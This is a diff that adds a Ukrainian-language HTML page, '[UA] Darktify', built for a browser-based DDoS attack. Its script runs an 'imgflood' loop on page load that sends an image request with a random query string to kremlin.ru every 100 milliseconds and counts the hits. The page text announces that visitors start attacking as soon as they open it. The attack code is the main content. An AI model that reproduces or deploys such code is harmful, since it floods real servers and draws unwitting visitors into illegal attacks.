@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>
+    [UA] Darktify
+  </title>
+  <style>
+  #body{
+    text-align:center;
+    background-color: yellow;
+    color:blue;
+  }
+</style>
+</head>
+<body id="body">
+  <h1>[UA] Darktify</h1>
+  <p style="font-size:18pt;">Заходячи на цей сайт ти автоматично починаешь ддосити(відправляти пакети) на ворожі сайти
+Вже незабаром ми додамо список сайтів які ти атакуєш и зробимо сайт дещо зручнішим!
+А поки що ти можешь це побачити перейшовши за посиланням.
+<span style="font-size:24pt;font-weight:bold;">Слава Україні!</span>
+  </p>
+    <h2>ЦЕЛЬ - <a href="http://kremlin.ru" target="_blank">http://kremlin.ru</a><h2>
+      Атаковано разів: <span id="a1" style="background-color: blue;border:2px solid blue;color:white;font-weight:bold;"></span>
+</body>
+<script>
+var requests = 0;
+//ddos site (imgflood)
+  setInterval(function imgflood() {
+    var TARGET = 'kremlin.ru'
+    var URI = '/index.php?'
+    var pic = new Image()
+    var rand = Math.floor(Math.random() * 1000)
+    pic.src = 'http://'+TARGET+URI+rand+'=val'
+    requests++;
+    if(requests%5==0){
+      console.log("Attacking "+TARGET+" for " + requests+" times!");
+      document.getElementById('a1').innerHTML = requests;
+    }
+  },100);
+</script>
+<!--
+Made by Darktify. Times changed.
+[ares]
+ -->
+</html>
